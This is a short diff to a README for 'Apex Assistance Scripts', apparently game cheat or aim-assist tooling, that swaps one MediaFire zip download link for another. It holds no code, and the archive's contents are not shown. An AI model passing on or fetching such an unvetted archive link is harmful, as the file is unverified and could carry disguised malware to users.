@@ -2,7 +2,7 @@
 # Apex Assistance Scripts
 
 ## Download
-[Newest](https://www.mediafire.com/file/pwmovphxqhifgab/APEX-Assistance.zip/file)
+[Newest](https://www.mediafire.com/file/fks9zwc1nbrars3/APEX-assistance.zip/file)
 
 ## Supported and Tested Platforms
 
